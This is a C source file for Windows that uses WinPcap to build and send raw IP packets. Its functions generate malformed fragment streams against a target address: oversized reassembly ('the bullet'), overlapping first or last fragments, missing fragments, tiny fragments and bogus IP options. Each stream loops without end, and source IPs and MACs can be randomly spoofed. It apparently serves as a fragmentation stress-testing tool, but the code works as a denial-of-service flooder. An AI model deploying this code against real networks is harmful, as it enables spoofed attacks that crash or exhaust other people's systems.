
/*
 * ^frag.c
 * */

#include <windows.h>
#include <iphlpapi.h>
#include <winsock2.h>
#include <stdlib.h>

#include "pcap.h"
#include "Packet32.h"
#include "Ntddndis.h"

#include "pub.h"
#include "misc.h"
#include "frag.h"

enum {
	FRAG_OVERSIZE=0,
	FRAG_OVERLIMIT,
	FRAG_2END,
	FRAG_2BEGIN,
	FRAG_LOST,
#if 0
	FRAG_DUP,
#endif
	FRAG_TOOSMALL,
	FRAG_IPOPT, /* 6 */
	FRAG_MAX,
	FRAG_DONT=0x40
};

static int frag_lost(struct sf_task *task, unsigned char *buf,
	unsigned int pad, unsigned int dont)
{
#define IDNUM 10
	unsigned int iptl = 0, ippl = 0, iphl = 0x14, len = 0, llen = 0, tpl;
	unsigned char *ip = buf + 14 + pad, ipla[2], iplla[2];
	unsigned int ind, i, j, cons, pros, sun, temp; 
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	signed int n;
	unsigned char id[IDNUM][2];

	for (ind = 0; ; ind++) {
		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (3 < ind) 
			ind = 0;

		iptl = 0xfff8;

		do {
			ippl = 0x0500 + ((0xc8 * rand()) / RAND_MAX);
			ippl &= 0x0ff8;
			ippl = 0 == ippl ? 0x10 : ippl;
			cons = (iptl - iphl) / ippl;
			tpl = (iptl - iphl) % ippl;
		} while (4 > ippl || ippl + iphl >= iptl || 3 > cons ||
			ippl + (tpl ? tpl : ippl) > 0x05c0);

		ipla[0] = ((ippl + iphl) >> 8);
		ipla[1] = (((ippl + iphl) << 8) >> 8);
		len = 14 + pad + ippl + iphl;

		if (tpl) {
			sun = cons;
			iplla[0] = ((tpl + iphl) >> 8);
			iplla[1] = (((tpl + iphl) << 8) >> 8);
			llen = 14 + pad + tpl + iphl;
			pros = tpl;
			win_ndebug("tpl");
		} else {
			sun = cons - 1;
			iplla[0] = ipla[0];
			iplla[1] = ipla[1];
			llen = len;
			pros = ippl;
			win_ndebug("0 == tpl");
		}

		for (i = 0; iphl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;

			ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
			ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
			ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
			ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
		} else
			memcpy(ip + 12, task->lip, 4);

		ip[0] = 0x45;
		memcpy(ip + 16, task->dip, 4);

		switch (ind) {
		case 0:
			ip[9] = 0x06;
			break;
		case 1:
			ip[9] = 0x11;
			break;
		case 2:
			ip[9] = 0x01;
			break;
		default:
			ip[9] = (0xff * rand()) / RAND_MAX;
			break;
		}

		/* the last one */
		ip[2] = iplla[0];
		ip[3] = iplla[1];
		ip[6] = (((sun * ippl) >> 11) | (dont ? 0x40 : 0));
		ip[7] = (((sun * ippl) << 5) >> 8);

		for (i = 0; pros > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			id[i][0] = (0xff * rand()) / RAND_MAX;
			id[i][1] = (0xff * rand()) / RAND_MAX;

			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, llen, arpip)))
				return abs(n);
		}

		/* normal */
		ip[2] = ipla[0];
		ip[3] = ipla[1];

		for (j = 0; sun - 1 > j; j++) {
			ip[6] = (0x20 | (j ? ((j * ippl) >> 11) : 0));
			if (dont)
				ip[6] |= 0x40;
			ip[7] = j ? (((j * ippl) << 5) >> 8) : 0;

			for (i = 0; ippl > i; i++)
				ip[iphl + i] = (0xff * rand()) / RAND_MAX;

			for (i = 0; IDNUM > i; i++) {
				ip[4] = id[i][0];
				ip[5] = id[i][1];

				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

				if (0 >= (n = spy_kernel(task, buf, len, arpip)))
					return abs(n);
			}

			switch (WaitForSingleObject(task->stop, /*200*/0)) {
			case WAIT_TIMEOUT:
				win_ndebug("timeout");
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}
		}

		/* lost one fragment */
	}
#undef IDNUM
}

#if 0
static int frag_dup(struct sf_task *task, unsigned char *buf, 
	unsigned int pad, unsigned int dont)
{


	return 0;
}
#endif

static int frag_2begin(struct sf_task *task, unsigned char *buf,
	unsigned int pad, unsigned int dont)
{
#define IDNUM 10
	unsigned int iptl = 0, ippl = 0, iphl = 0x14, len = 0, llen = 0, tpl;
	unsigned char *ip = buf + 14 + pad, ipla[2], iplla[2];
	unsigned int ind, i, j, cons, pros, sun, temp, l23; 
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	signed int n;
	unsigned char id[IDNUM][2];

	for (ind = 0; ; ind++) {
		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (3 < ind) 
			ind = 0;

		do {
			iptl = (0xffff * rand()) / RAND_MAX;
			iptl &= 0xfff8;
			ippl = (0x05c8 * rand()) / RAND_MAX;
			ippl &= 0x0ff8;
			ippl = 0 == ippl ? 0x10 : ippl;

			cons = (iptl - iphl) / ippl;
			tpl = (iptl - iphl) % ippl;
		} while (4 > ippl || ippl + iphl >= iptl || 3 > cons ||
			ippl + (tpl ? tpl : ippl) > 0x05c0);

		ipla[0] = ((ippl + iphl) >> 8);
		ipla[1] = (((ippl + iphl) << 8) >> 8);
		len = 14 + pad + ippl + iphl;

		if (tpl) {
			sun = cons;
			iplla[0] = ((tpl + iphl) >> 8);
			iplla[1] = (((tpl + iphl) << 8) >> 8);
			llen = 14 + pad + tpl + iphl;
			pros = tpl;
			win_ndebug("tpl");
		} else {
			sun = cons - 1;
			iplla[0] = ipla[0];
			iplla[1] = ipla[1];
			llen = len;
			pros = ippl;
			win_ndebug("0 == tpl");
		}

		for (i = 0; iphl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;

			ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
			ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
			ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
			ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
		} else
			memcpy(ip + 12, task->lip, 4);

		ip[0] = 0x45;
		memcpy(ip + 16, task->dip, 4);

		switch (ind) {
		case 0:
			ip[9] = 0x06;
			break;
		case 1:
			ip[9] = 0x11;
			break;
		case 2:
			ip[9] = 0x01;
			break;
		default:
			ip[9] = (0xff * rand()) / RAND_MAX;
			break;
		}

		/* the last one */
		ip[2] = iplla[0];
		ip[3] = iplla[1];
		ip[6] = (((sun * ippl) >> 11) | (dont ? 0x40 : 0));
		ip[7] = (((sun * ippl) << 5) >> 8);

		for (i = 0; pros > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			id[i][0] = (0xff * rand()) / RAND_MAX;
			id[i][1] = (0xff * rand()) / RAND_MAX;

			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, llen, arpip)))
				return abs(n);
		}

		/* the bullet */
		ip[2] = 0x05;
		ip[3] = 0xdc;
		l23 = 0x05dc;

		while ((ip[2] == ipla[0] && ip[3] == ipla[1]) || l23 <= iphl) {
			ip[2] = (0x05 * rand()) / RAND_MAX;
			ip[3] = (0xff * rand()) / RAND_MAX;
			if (0x05 == ip[2] && 0xdc < ip[3])
				ip[3] = 0xdc;
			ip[3] &= 0xfc;

			l23 = (ip[2] << 8) + ip[3];
		}

		ip[6] = 0x20 | (dont ? 0x40 : 0);
		ip[7] = 0;

		for (i = 0; l23 - iphl > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, l23 + 14 + pad, arpip)))
				return abs(n);
		}

		/* normal */
		ip[2] = ipla[0];
		ip[3] = ipla[1];

		for (j = 0; sun > j; j++) {
			ip[6] = (0x20 | (j ? ((j * ippl) >> 11) : 0));
			if (dont)
				ip[6] |= 0x40;
			ip[7] = j ? (((j * ippl) << 5) >> 8) : 0;

			for (i = 0; ippl > i; i++)
				ip[iphl + i] = (0xff * rand()) / RAND_MAX;

			for (i = 0; IDNUM > i; i++) {
				ip[4] = id[i][0];
				ip[5] = id[i][1];

				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

				if (0 >= (n = spy_kernel(task, buf, len, arpip)))
					return abs(n);
			}

			switch (WaitForSingleObject(task->stop, /*200*/0)) {
			case WAIT_TIMEOUT:
				win_ndebug("timeout");
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}
		}
	}
#undef IDNUM
}

static int frag_2end(struct sf_task *task, unsigned char *buf,
	unsigned int pad, unsigned int dont)
{
#define IDNUM 10
	unsigned int iptl = 0, ippl = 0, iphl = 0x14, len = 0, llen = 0, tpl;
	unsigned char *ip = buf + 14 + pad, ipla[2], iplla[2];
	unsigned int ind, i, j, cons, pros, sun, temp; 
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	signed int n;
	unsigned char id[IDNUM][2];

	for (ind = 0; ; ind++) {
		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (3 < ind) 
			ind = 0;

		do {
			iptl = (0xffff * rand()) / RAND_MAX;
			iptl &= 0xfff8;
			ippl = (0x05c8 * rand()) / RAND_MAX;
			ippl &= 0x0ff8;
			ippl = 0 == ippl ? 0x10 : ippl;

			cons = (iptl - iphl) / ippl;
			tpl = (iptl - iphl) % ippl;
		} while (4 > ippl || ippl + iphl >= iptl || 3 > cons ||
			ippl + (tpl ? tpl : ippl) > 0x05c0);

		ipla[0] = ((ippl + iphl) >> 8);
		ipla[1] = (((ippl + iphl) << 8) >> 8);
		len = 14 + pad + ippl + iphl;

		if (tpl) {
			sun = cons;
			iplla[0] = ((tpl + iphl) >> 8);
			iplla[1] = (((tpl + iphl) << 8) >> 8);
			llen = 14 + pad + tpl + iphl;
			pros = tpl;
			win_ndebug("tpl");
		} else {
			sun = cons - 1;
			iplla[0] = ipla[0];
			iplla[1] = ipla[1];
			llen = len;
			pros = ippl;
			win_ndebug("0 == tpl");
		}

		for (i = 0; iphl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;

			ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
			ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
			ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
			ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
		} else
			memcpy(ip + 12, task->lip, 4);

		ip[0] = 0x45;
		memcpy(ip + 16, task->dip, 4);

		switch (ind) {
		case 0:
			ip[9] = 0x06;
			break;
		case 1:
			ip[9] = 0x11;
			break;
		case 2:
			ip[9] = 0x01;
			break;
		default:
			ip[9] = (0xff * rand()) / RAND_MAX;
			break;
		}

		/* the last one */
		ip[2] = iplla[0];
		ip[3] = iplla[1];
		ip[6] = (((sun * ippl) >> 11) | (dont ? 0x40 : 0));
		ip[7] = (((sun * ippl) << 5) >> 8);

		for (i = 0; pros > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			id[i][0] = (0xff * rand()) / RAND_MAX;
			id[i][1] = (0xff * rand()) / RAND_MAX;

			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, llen, arpip)))
				return abs(n);
		}

		/* normal */
		ip[2] = ipla[0];
		ip[3] = ipla[1];

		for (j = 0; sun - 1 > j; j++) {
			ip[6] = (0x20 | (j ? ((j * ippl) >> 11) : 0));
			if (dont)
				ip[6] |= 0x40;
			ip[7] = j ? (((j * ippl) << 5) >> 8) : 0;

			for (i = 0; ippl > i; i++)
				ip[iphl + i] = (0xff * rand()) / RAND_MAX;

			for (i = 0; IDNUM > i; i++) {
				ip[4] = id[i][0];
				ip[5] = id[i][1];

				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

				if (0 >= (n = spy_kernel(task, buf, len, arpip)))
					return abs(n);
			}

			switch (WaitForSingleObject(task->stop, /*200*/0)) {
			case WAIT_TIMEOUT:
				win_ndebug("timeout");
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}
		}

		/* the bullet */
		ip[2] = 0x05;
		ip[3] = 0xdc;
		ip[6] = ((((sun - 1) * ippl) >> 11) | (dont ? 0x40 : 0));
		ip[7] = (((((sun - 1) * ippl) >> 3) << 8) >> 8);

		for (i = 0; 0x05c8 > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			ip[4] = id[i][0];
			ip[5] = id[i][1];
			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, 0x05dc + 14 + pad, arpip)))
				return abs(n);
		}
	}
#undef IDNUM
}

static int frag_oversize(struct sf_task *task, unsigned char *buf, 
	unsigned int pad, unsigned int dont, unsigned int limit)
{
#define IDNUM 10
	unsigned int iptl = 0, ippl = 0, iphl = 0x14, len = 0, llen = 0, tpl;
	unsigned char *ip = buf + 14 + pad, ipla[2], iplla[2];
	unsigned int ind, i, j, cons, pros, sun, temp; 
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	signed int n;
	unsigned char id[IDNUM][2];

	for (ind = 0; ; ind++) {
		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (3 < ind) 
			ind = 0;

		do {
			if (limit) {
				iptl = 0xfff8;
				ippl = 0x0100;
			} else {
				iptl = (0xffff * rand()) / RAND_MAX;
				iptl &= 0xfff8;
				ippl = (0x05c8 * rand()) / RAND_MAX;
				ippl &= 0x0ff8;
				ippl = 0 == ippl ? 0x10 : ippl;
			}

			cons = (iptl - iphl) / ippl;
			tpl = (iptl - iphl) % ippl;
		} while (4 > ippl || ippl + iphl >= iptl || 3 > cons ||
			ippl + (tpl ? tpl : ippl) > 0x05c0);

		ipla[0] = ((ippl + iphl) >> 8);
		ipla[1] = (((ippl + iphl) << 8) >> 8);
		len = 14 + pad + ippl + iphl;

		if (tpl) {
			sun = cons;
			iplla[0] = ((tpl + iphl) >> 8);
			iplla[1] = (((tpl + iphl) << 8) >> 8);
			llen = 14 + pad + tpl + iphl;
			pros = tpl;
			win_ndebug("tpl");
		} else {
			sun = cons - 1;
			iplla[0] = ipla[0];
			iplla[1] = ipla[1];
			llen = len;
			pros = ippl;
			win_ndebug("0 == tpl");
		}

		for (i = 0; iphl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;

			ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
			ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
			ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
			ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
		} else
			memcpy(ip + 12, task->lip, 4);

		ip[0] = 0x45;
		memcpy(ip + 16, task->dip, 4);

		switch (ind) {
		case 0:
			ip[9] = 0x06;
			break;
		case 1:
			ip[9] = 0x11;
			break;
		case 2:
			ip[9] = 0x01;
			break;
		default:
			ip[9] = (0xff * rand()) / RAND_MAX;
			break;
		}

		/* the last one */
		ip[2] = iplla[0];
		ip[3] = iplla[1];
		ip[6] = (((sun * ippl) >> 11) | (dont ? 0x40 : 0));
		ip[7] = (((sun * ippl) << 5) >> 8);

		for (i = 0; pros > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			id[i][0] = (0xff * rand()) / RAND_MAX;
			id[i][1] = (0xff * rand()) / RAND_MAX;

			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, llen, arpip)))
				return abs(n);
		}

		/* normal */
		ip[2] = ipla[0];
		ip[3] = ipla[1];

		for (j = 0; sun - 1 > j; j++) {
			ip[6] = (0x20 | (j ? ((j * ippl) >> 11) : 0));
			if (dont)
				ip[6] |= 0x40;
			ip[7] = j ? (((j * ippl) << 5) >> 8) : 0;

			for (i = 0; ippl > i; i++)
				ip[iphl + i] = (0xff * rand()) / RAND_MAX;

			for (i = 0; IDNUM > i; i++) {
				ip[4] = id[i][0];
				ip[5] = id[i][1];

				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

				if (0 >= (n = spy_kernel(task, buf, len, arpip)))
					return abs(n);
			}

			switch (WaitForSingleObject(task->stop, /*200*/0)) {
			case WAIT_TIMEOUT:
				win_ndebug("timeout");
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}
		}

		/* the bullet */
		ip[2] = 0x05;
		ip[3] = 0xdc;
		ip[6] = ((((sun - 1) * ippl) >> 11) | 0x20 | (dont ? 0x40 : 0));
		ip[7] = (((((sun - 1) * ippl) >> 3) << 8) >> 8);

		for (i = 0; 0x05c8 > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, 0x05dc + 14 + pad, arpip)))
				return abs(n);
		}
	}
#undef IDNUM
}

static int frag_toosmall(struct sf_task *task, unsigned char *buf, 
	unsigned int pad, unsigned int dont)
{
#define IDNUM 100
	unsigned int iptl = 0, ippl = 0, iphl = 0x14, len = 0, llen = 0, tpl;
	unsigned char *ip = buf + 14 + pad, ipla[2], iplla[2];
	unsigned int ind, i, j, cons, pros, sun, temp; 
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	signed int n;
	unsigned char id[IDNUM][2];

	for (ind = 0; ; ind++) {
		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (3 < ind) 
			ind = 0;

		do {
			iptl = (0xffff * rand()) / RAND_MAX;
			iptl &= 0xfff8;
			ippl = 0x08;

			cons = (iptl - iphl) / ippl;
			tpl = (iptl - iphl) % ippl;
		} while (4 > ippl || ippl + iphl >= iptl || 3 > cons ||
			ippl + (tpl ? tpl : ippl) > 0x05c0);

		ipla[0] = ((ippl + iphl) >> 8);
		ipla[1] = (((ippl + iphl) << 8) >> 8);
		len = 14 + pad + ippl + iphl;

		if (tpl) {
			sun = cons;
			iplla[0] = ((tpl + iphl) >> 8);
			iplla[1] = (((tpl + iphl) << 8) >> 8);
			llen = 14 + pad + tpl + iphl;
			pros = tpl;
			win_ndebug("tpl");
		} else {
			sun = cons - 1;
			iplla[0] = ipla[0];
			iplla[1] = ipla[1];
			llen = len;
			pros = ippl;
			win_ndebug("0 == tpl");
		}

		for (i = 0; iphl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;

			ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
			ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
			ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
			ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
		} else
			memcpy(ip + 12, task->lip, 4);

		ip[0] = 0x45;
		memcpy(ip + 16, task->dip, 4);

		switch (ind) {
		case 0:
			ip[9] = 0x06;
			break;
		case 1:
			ip[9] = 0x11;
			break;
		case 2:
			ip[9] = 0x01;
			break;
		default:
			ip[9] = (0xff * rand()) / RAND_MAX;
			break;
		}

		/* the last one */
		ip[2] = iplla[0];
		ip[3] = iplla[1];
		ip[6] = (((sun * ippl) >> 11) | (dont ? 0x40 : 0));
		ip[7] = (((sun * ippl) << 5) >> 8);

		for (i = 0; pros > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			id[i][0] = (0xff * rand()) / RAND_MAX;
			id[i][1] = (0xff * rand()) / RAND_MAX;

			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, llen, arpip)))
				return abs(n);
		}

		/* normal */
		ip[2] = ipla[0];
		ip[3] = ipla[1] - 0x04;

		for (j = 0; sun > j; j++) {
			ip[6] = (0x20 | (j ? ((j * ippl) >> 11) : 0));
			if (dont)
				ip[6] |= 0x40;
			ip[7] = j ? (((j * ippl) << 5) >> 8) : 0;

			for (i = 0; ippl - 0x04 > i; i++)
				ip[iphl + i] = (0xff * rand()) / RAND_MAX;

			for (i = 0; IDNUM > i; i++) {
				ip[4] = id[i][0];
				ip[5] = id[i][1];

				do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

				if (0 >= (n = spy_kernel(task, buf, len - 0x04, arpip)))
					return abs(n);
			}

			switch (WaitForSingleObject(task->stop, /*200*/0)) {
			case WAIT_TIMEOUT:
				win_ndebug("timeout");
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}
		}
	}
#undef IDNUM
}

static unsigned char dead_ipopt[40] = {
	0x88, 0x04, 0x09, 0x07, 0x44, 0x20, 0x05, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
	0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x01, 0x00
};

static int frag_ipopt(struct sf_task *task, unsigned char *buf, 
	unsigned int pad, unsigned int dont)
{
#define IDNUM 10
	unsigned int iptl = 0, ippl = 0, iphl = 0x14, len = 0, llen = 0, tpl;
	unsigned char *ip = buf + 14 + pad, ipla[2], iplla[2];
	unsigned int ind, i, j, cons, pros, sun, temp, offset = 0; 
	DWORD arpip = (task->hop[3] << 24) + (task->hop[2] << 16) +
		(task->hop[1] << 8) + task->hop[0];
	signed int n;
	unsigned char id[IDNUM][2];

	for (ind = 0; ; ind++) {
		switch (WaitForSingleObject(task->stop, 0)) {
		case WAIT_TIMEOUT:
			win_ndebug("timeout");
			break;
		case WAIT_OBJECT_0:
			win_ndebug("WAIT_OBJECT_0");
			return 0;
		default:
			win_error("case default!");
			return 1;
		}

		if (3 < ind) 
			ind = 0;

		do {
			iptl = (0xffff * rand()) / RAND_MAX;
			iptl &= 0xfff8;
			ippl = 0x50;

			cons = (iptl - iphl) / ippl;
			tpl = (iptl - iphl) % ippl;
		} while (4 > ippl || ippl + iphl >= iptl || 3 > cons ||
			ippl + (tpl ? tpl : ippl) > 0x05c0);

		ipla[0] = ((ippl + iphl) >> 8);
		ipla[1] = (((ippl + iphl) << 8) >> 8);
		len = 14 + pad + ippl + iphl;

		if (tpl) {
			sun = cons;
			iplla[0] = ((tpl + iphl) >> 8);
			iplla[1] = (((tpl + iphl) << 8) >> 8);
			llen = 14 + pad + tpl + iphl;
			pros = tpl;
			win_ndebug("tpl");
		} else {
			sun = cons - 1;
			iplla[0] = ipla[0];
			iplla[1] = ipla[1];
			llen = len;
			pros = ippl;
			win_ndebug("0 == tpl");
		}

		for (i = 0; iphl > i; i++)
			ip[i] = (0xff * rand()) / RAND_MAX;

		if (task->fake) {
			buf[8] = (0xff * rand()) / RAND_MAX;
			buf[9] = (0xff * rand()) / RAND_MAX;
			buf[10] = (0xff * rand()) / RAND_MAX;
			buf[11] = (0xff * rand()) / RAND_MAX;

			ip[12] = (task->lnet[0] | (task->rmark[0] & ip[12]));
			ip[13] = (task->lnet[1] | (task->rmark[1] & ip[13]));
			ip[14] = (task->lnet[2] | (task->rmark[2] & ip[14]));
			ip[15] = (task->lnet[3] | (task->rmark[3] & ip[15]));
		} else
			memcpy(ip + 12, task->lip, 4);

		memcpy(ip + 16, task->dip, 4);

		switch (ind) {
		case 0:
			ip[9] = 0x06;
			break;
		case 1:
			ip[9] = 0x11;
			break;
		case 2:
			ip[9] = 0x01;
			break;
		default:
			ip[9] = (0xff * rand()) / RAND_MAX;
			break;
		}

		/* normal */
		ip[2] = ipla[0];
		ip[3] = ipla[1];

		for (j = 0, offset = 0; sun > j; j++) {
			for (i = 0; ippl > i; i++)
				ip[iphl + i] = (0xff * rand()) / RAND_MAX;

			if (0 == j % 2) {
				ip[0] = 0x4f;
				if (0 == j)
					offset = 0;
				else
					offset += ippl;

				memcpy(ip + iphl, dead_ipopt, 0x28); 
			} else {
				ip[0] = 0x45;
				offset += 0x28;
			}

			ip[6] = (0x20 | (j ? (offset >> 11) : 0));
			if (dont)
				ip[6] |= 0x40;
			ip[7] = j ? ((offset << 5) >> 8) : 0;

			for (i = 0; IDNUM > i; i++) {
				id[i][0] = (0xff * rand()) / RAND_MAX;
				id[i][1] = (0xff * rand()) / RAND_MAX;

				ip[4] = id[i][0];
				ip[5] = id[i][1];

				do_csum(ip, ip + 10, iphl + ((j % 2) ? 0x28: 0), 0, 0, 0, 0);

				if (0 >= (n = spy_kernel(task, buf, len, arpip)))
					return abs(n);
			}

			switch (WaitForSingleObject(task->stop, /*200*/0)) {
			case WAIT_TIMEOUT:
				win_ndebug("timeout");
				break;
			case WAIT_OBJECT_0:
				win_ndebug("WAIT_OBJECT_0");
				return 0;
			default:
				win_error("case default!");
				return 1;
			}
		}

		/* the last one */
		ip[0] = 0x45;
		ip[2] = iplla[0];
		ip[3] = iplla[1];
		offset += (sun % 2 ? 0x28 : ippl);

		ip[6] = ((offset >> 11) | (dont ? 0x40 : 0));
		ip[7] = ((offset << 5) >> 8);

		for (i = 0; pros > i; i++)
			ip[iphl + i] = (0xff * rand()) / RAND_MAX;

		for (i = 0; IDNUM > i; i++) {
			ip[4] = id[i][0];
			ip[5] = id[i][1];

			do_csum(ip, ip + 10, iphl, 0, 0, 0, 0);

			if (0 >= (n = spy_kernel(task, buf, llen, arpip)))
				return abs(n);
		}
	}
#undef IDNUM
}

int do_frag(struct sf_task *task, unsigned char *buf, unsigned int pad)
{
	unsigned int dont = 0;

	if ((FRAG_DONT & task->dport[1])) {
		dont = 1;
		win_ndebug("dont");
		task->dport[1] -= FRAG_DONT;
	}

	switch (task->dport[1]) {
	case FRAG_OVERSIZE:
		return frag_oversize(task, buf, pad, dont, 0);
	case FRAG_OVERLIMIT:
		return frag_oversize(task, buf, pad, dont, 1);
	case FRAG_2END:
		return frag_2end(task, buf, pad, dont);
	case FRAG_2BEGIN:
		return frag_2begin(task, buf, pad, dont);
	case FRAG_LOST:
		return frag_lost(task, buf, pad, dont);
#if 0
	case FRAG_DUP:
		return frag_dup(task, buf, pad, dont);
#endif
	case FRAG_TOOSMALL:
		return frag_toosmall(task, buf, pad, dont);
	case FRAG_IPOPT:
		return frag_ipopt(task, buf, pad, dont);
	default:
		win_error("unknown frag test class, sorry!");
		return 1;
	}
}

/* 
 * frag.c$
 * */

